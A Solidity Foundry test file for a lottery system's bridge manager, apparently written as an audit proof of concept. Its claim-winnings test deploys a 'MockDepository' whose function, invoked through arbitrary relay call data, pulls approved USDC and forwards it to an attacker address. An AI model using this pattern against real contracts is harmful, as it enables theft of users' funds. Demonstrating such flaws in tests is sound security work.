// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {Jackpot, IJackpot} from "contracts/Jackpot.sol";
import {JackpotTicketNFT} from "contracts/JackpotTicketNFT.sol";
import {JackpotLPManager} from "contracts/JackpotLPManager.sol";
import {GuaranteedMinimumPayoutCalculator} from "contracts/GuaranteedMinimumPayoutCalculator.sol";
import {ScaledEntropyProvider} from "contracts/ScaledEntropyProvider.sol";
import {ScaledEntropyProviderMock} from "contracts/mocks/ScaledEntropyProviderMock.sol";
import {JackpotBridgeManager} from "contracts/JackpotBridgeManager.sol";
import {EntropyMock} from "contracts/mocks/EntropyMock.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
import {Test, console2} from "forge-std/Test.sol";

contract JackpotBridgeManagerTest is Test {
    ERC20Mock usdcMock;
    Jackpot jackpot;
    JackpotLPManager jackpotLPManager;
    JackpotTicketNFT jackpotNFT;
    ScaledEntropyProviderMock scaledEntropyProvider;
    GuaranteedMinimumPayoutCalculator payoutCalculator;
    JackpotBridgeManager jackpotBridgeManager;
    uint256 constant PRECISE_UNIT = 1e18;

    uint256 drawingDurationInSeconds = 86400; //1 day in seconds
    uint8 normalBallMax = 30;
    uint8 bonusballMin = 5;
    uint256 lpEdgeTarget = 0.3e18;
    uint256 reserveRatio = 0.2e18;
    uint256 referralFee = 0.065e18;
    uint256 referralWinShare = 0.05e18;
    uint256 protocolFee = 0.01e18;
    uint256 protocolFeeThreshold = 1e6;
    uint256 ticketPrice = 1e6;
    uint256 maxReferrers = 5;
    uint32 entropyBaseGasLimit = 10000000;
    uint32 entropyVariableGasLimit = 250000;
    uint256 entropyFee = 0.00005e18;
    uint256 minimumPayout = 1e6;
    uint256 premiumTierMinAllocation = 0.2e18;
    bool[12] minPayoutTiers = [false, true, false, true, true, true, true, true, true, true, true, true];
    uint256[12] premiumTierWeights =
        [0, 0.17e18, 0, 0.13e18, 0.12e18, 0.05e18, 0.05e18, 0.02e18, 0.02e18, 0.01e18, 0.04e18, 0.39e18];
    bytes32 source = bytes32(bytes("test"));

    //actors
    address owner = makeAddr("owner");
    // {address buyerOne, uint256 buyerOnePrivateKey} = makeAddrAndKey("buyerOne");
    uint256 buyerOnePrivateKey = uint256(keccak256(abi.encodePacked("my random seed")));
    address buyerOne = vm.rememberKey(buyerOnePrivateKey);
    address buyerTwo = makeAddr("buyerTwo");
    address referrerOne = makeAddr("referrerOne");
    address referrerTwo = makeAddr("referrerTwo");
    address referrerThree = makeAddr("referrerThree");
    address solver = makeAddr("solver");

    uint256 initialUSDCAmount = 1000000000e6;

    function setUp() external {
        vm.startPrank(owner);
        usdcMock = new ERC20Mock();
        usdcMock.mint(owner, initialUSDCAmount);

        jackpot = new Jackpot(
            drawingDurationInSeconds,
            normalBallMax,
            bonusballMin,
            lpEdgeTarget,
            reserveRatio,
            referralFee,
            referralWinShare,
            protocolFee,
            protocolFeeThreshold,
            ticketPrice,
            maxReferrers,
            entropyBaseGasLimit
        );
        jackpotLPManager = new JackpotLPManager(jackpot);
        jackpotNFT = new JackpotTicketNFT(jackpot);
        scaledEntropyProvider =
            new ScaledEntropyProviderMock(entropyFee, address(jackpot), Jackpot.scaledEntropyCallback.selector);
        payoutCalculator = new GuaranteedMinimumPayoutCalculator(
            jackpot, minimumPayout, premiumTierMinAllocation, minPayoutTiers, premiumTierWeights
        );

        jackpot.initialize(usdcMock, jackpotLPManager, jackpotNFT, scaledEntropyProvider, payoutCalculator);
        jackpot.initializeLPDeposits(10000000e6);

        usdcMock.approve(address(jackpot), 1000000);

        jackpot.lpDeposit(1000000);

        jackpot.initializeJackpot(block.timestamp + drawingDurationInSeconds);

        jackpotBridgeManager = new JackpotBridgeManager(jackpot, jackpotNFT, usdcMock, "MegapotBridgeManager", "1.0.0");

        vm.stopPrank();
    }

    function testBuyNFTUsingBridgeManager() external {
        vm.prank(owner);
        usdcMock.approve(address(jackpotBridgeManager), 5e6);

        uint8[] memory normalsSet1 = new uint8[](5);
        normalsSet1[0] = 1;
        normalsSet1[1] = 2;
        normalsSet1[2] = 3;
        normalsSet1[3] = 4;
        normalsSet1[4] = 5;

        uint8[] memory normalsSet2 = new uint8[](5);
        normalsSet2[0] = 6;
        normalsSet2[1] = 7;
        normalsSet2[2] = 8;
        normalsSet2[3] = 9;
        normalsSet2[4] = 10;

        // Correct way to create an array of structs
        IJackpot.Ticket[] memory tickets = new IJackpot.Ticket[](2);
        tickets[0] = IJackpot.Ticket({normals: normalsSet1, bonusball: 1});
        tickets[1] = IJackpot.Ticket({normals: normalsSet2, bonusball: 2});

        address recipient = buyerOne;
        address[] memory referrers = new address[](3);
        referrers[0] = referrerOne;
        referrers[1] = referrerTwo;
        referrers[2] = referrerThree;

        uint256[] memory referrerSplits = new uint256[](3);
        referrerSplits[0] = 0.3333e18;
        referrerSplits[1] = 0.3333e18;
        referrerSplits[2] = 0.3334e18;

        vm.prank(owner);
        jackpotBridgeManager.buyTickets(tickets, recipient, referrers, referrerSplits, source);
    }

    function testClaimWinnings() external {
        vm.deal(owner, 100 ether);
        vm.prank(owner);
        usdcMock.approve(address(jackpotBridgeManager), 5e6);

        uint8[] memory normalsSet1 = new uint8[](5);
        normalsSet1[0] = 1;
        normalsSet1[1] = 2;
        normalsSet1[2] = 3;
        normalsSet1[3] = 4;
        normalsSet1[4] = 5;

        uint8[] memory normalsSet2 = new uint8[](5);
        normalsSet2[0] = 6;
        normalsSet2[1] = 7;
        normalsSet2[2] = 8;
        normalsSet2[3] = 9;
        normalsSet2[4] = 10;

        uint8[] memory normalsSet3 = new uint8[](5);
        normalsSet3[0] = 6;
        normalsSet3[1] = 7;
        normalsSet3[2] = 8;
        normalsSet3[3] = 9;
        normalsSet3[4] = 10;

        // Correct way to create an array of structs
        IJackpot.Ticket[] memory tickets = new IJackpot.Ticket[](3);
        tickets[0] = IJackpot.Ticket({normals: normalsSet1, bonusball: 2});
        tickets[1] = IJackpot.Ticket({normals: normalsSet2, bonusball: 2});
        tickets[2] = IJackpot.Ticket({normals: normalsSet3, bonusball: 3});

        address recipient = buyerOne;
        address[] memory referrers;
        uint256[] memory referrerSplits;

        vm.prank(owner);
        uint256[] memory ticketIds =
            jackpotBridgeManager.buyTickets(tickets, recipient, referrers, referrerSplits, source);

        vm.warp(block.timestamp + drawingDurationInSeconds + 1);

        Jackpot.DrawingState memory drawingState = jackpot.getDrawingState(1);
        vm.startPrank(owner);
        uint256 value =
            entropyFee + uint128(entropyBaseGasLimit + entropyVariableGasLimit * drawingState.bonusballMax) * 1e7;
        jackpot.runJackpot{value: value}();
        uint256[][] memory randomNumbers = new uint256[][](2);
        uint256[] memory randomNormals = new uint256[](5);
        randomNormals[0] = 1;
        randomNormals[1] = 2;
        randomNormals[2] = 3;
        randomNormals[3] = 4;
        randomNormals[4] = 5;

        uint256[] memory randomBonusBall = new uint256[](1);
        randomBonusBall[0] = 2;

        randomNumbers[0] = randomNormals;
        randomNumbers[1] = randomBonusBall;

        scaledEntropyProvider.randomnessCallback(randomNumbers);

        vm.stopPrank();
        uint256 expectedWinnings;
        uint256[] memory tierIds = jackpot.getTicketTierIds(ticketIds);
        for (uint256 i; i < ticketIds.length; i++) {
            uint256 rawWinnings = payoutCalculator.getTierPayout(1, tierIds[i]);
            uint256 referralShare = rawWinnings * referralWinShare / PRECISE_UNIT;
            expectedWinnings += rawWinnings - referralShare;
        }
        IJackpot.Ticket[] memory ticketsCopy = tickets;
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        MockDepository depository =
            new MockDepository(address(usdcMock), address(jackpotBridgeManager), expectedWinnings);

        JackpotBridgeManager.RelayTxData memory bridgeDetails = JackpotBridgeManager.RelayTxData({
            approveTo: address(depository),
            to: address(depository),
            data: abi.encodeCall(MockDepository.fetchUSDCAndTransferToAttacker, ())
        });

        bytes32 digest = jackpotBridgeManager.createClaimWinningsEIP712Hash(ticketIds, bridgeDetails);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(buyerOnePrivateKey, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        vm.prank(owner);
        jackpotBridgeManager.claimWinnings(ticketIds, bridgeDetails, signature);
    }
}

contract MockDepository {
    ERC20Mock usdcMock;
    address attacker;
    address bridgeManager;
    uint256 expectedAmount;

    constructor(address _usdc, address _bridgeManager, uint256 _expectedAmount) {
        usdcMock = ERC20Mock(_usdc);
        attacker = msg.sender;
        bridgeManager = _bridgeManager;
        expectedAmount = _expectedAmount;
    }

    function fetchUSDCAndTransferToAttacker() external {
        usdcMock.transferFrom(msg.sender, address(this), expectedAmount);
        usdcMock.transfer(attacker, usdcMock.balanceOf(address(this)));
    }
}
